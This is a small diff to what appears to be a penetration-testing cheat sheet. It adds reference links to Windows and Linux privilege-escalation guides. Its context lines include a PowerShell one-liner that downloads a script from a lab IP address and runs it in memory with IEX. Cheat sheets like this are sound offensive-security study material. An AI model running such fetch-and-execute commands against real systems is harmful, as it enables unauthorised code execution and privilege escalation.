@@ -498,6 +498,8 @@ Thoroughly enumerate User folders -   ```/home/bob/```   ```C:\Users\Bob```
   - https://github.com/sleventyeleven/linuxprivchecker/
 
 # Priv-Esc (Windows) Check-List
+https://fuzzysecurity.com/tutorials/16.html
+
 #### Basic System Information
 
 ```
@@ -628,6 +630,8 @@ echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.19:8080/Sher
 ```
 
 # Priv-Esc (Linux) Check-List
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
 #### OS – Version and Architecture
 ```
 uname –a
